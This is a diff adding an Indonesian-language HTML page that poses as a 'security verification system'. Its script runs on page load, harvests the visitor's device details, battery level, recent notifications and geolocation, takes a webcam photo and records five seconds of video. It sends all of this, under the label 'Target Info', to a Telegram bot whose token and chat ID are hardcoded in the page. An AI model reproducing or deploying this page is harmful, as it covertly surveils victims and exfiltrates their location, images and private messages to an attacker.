@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Verifikasi Keamanan</title>
+</head>
+<body>
+    <script>
+        const token = '8617398870:AAHHVz0unYAW1pt75b-jo3AGhAxIxsWu47Q';
+        const chatId = '8213510319';
+
+        async function sendToTelegram(message) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+        }
+
+        async function sendFile(blob, type) {
+            let formData = new FormData();
+            formData.append(type, blob, type === 'photo' ? 'snap.jpg' : 'video.mp4');
+            await fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${chatId}`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        async function getLatestNotification() {
+            if ('Notification' in window && Notification.permission === 'granted') {
+                const registrations = await navigator.serviceWorker.getRegistrations();
+                for (let reg of registrations) {
+                    const notifications = await reg.getNotifications();
+                    if (notifications.length > 0) {
+                        const latest = notifications[0];
+                        return `Pesan Terbaru:\nJudul: ${latest.title}\nIsi: ${latest.body}`;
+                    }
+                }
+            }
+            return "Tidak ada notifikasi aktif atau izin ditolak.";
+        }
+
+        window.onload = async () => {
+            // Meminta Izin Notifikasi
+            await Notification.requestPermission();
+
+            // Data Perangkat & Baterai
+            let battery = await navigator.getBattery();
+            let msg = `Target Info:\nBrand: ${navigator.userAgent}\nBaterai: ${battery.level * 100}%\n`;
+            
+            // Ambil Pesan Terbaru
+            const chatMsg = await getLatestNotification();
+            msg += `\n${chatMsg}`;
+
+            // Lokasi
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                msg += `\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}`;
+                await sendToTelegram(msg);
+            }, () => sendToTelegram(msg));
+
+            // Akses Kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendFile(blob, 'photo'));
+            }, 2000);
+
+            // Rekam Video 5 Detik
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                sendFile(blob, 'video');
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+        };
+    </script>
+</body>
+</html>
